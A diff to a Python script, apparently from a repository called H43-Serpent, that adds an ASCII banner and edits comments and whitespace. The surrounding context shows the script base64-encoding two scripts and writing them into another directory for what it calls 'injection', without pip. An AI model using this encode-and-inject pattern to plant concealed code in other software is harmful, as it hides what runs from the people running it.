@@ -1,10 +1,19 @@
-'''
+'''                                                
+ _____ ___ ___     _____                     _   
+|  |  | | |_  |___|   __|___ ___ ___ ___ ___| |_ 
+|     |_  |_  |___|__   | -_|  _| . | -_|   |  _|
+|__|__| |_|___|   |_____|___|_| |  _|___|_|_|_|  
+                                |_|              
+
+
 Author: Fytex
 REPO: https://github.com/Fytex/H43-Serpent
 '''
 
 
-# Avoid using pip so injection is as fast as possible
+# Avoid using Pip so injection:
+# -> is fast as possible
+# -> doesn't stall without internet connection
 import os
 import sys
 import base64
@@ -49,7 +58,7 @@ with open(os.path.join(SCRIPTS_FOLDER, MAIN_SCRIPT_NAME)) as from_file:
     text = replacement_line + from_file.read()
     encoded = base64.b64encode(text.encode())
 
-   
+
 with open(os.path.join(d, MAIN_SCRIPT_NAME), 'w') as to_file:  
     to_file.write(file_base64_content.format(encoded))
 
@@ -59,7 +68,7 @@ with open(os.path.join(SCRIPTS_FOLDER, LIB_SCRIPT_NAME)) as from_file:
     text = from_file.read()
     encoded = base64.b64encode(text.encode())
 
-       
+
 with open(os.path.join(d, LIB_SCRIPT_NAME), 'w') as to_file:  
     to_file.write(file_base64_content.format(encoded))
 
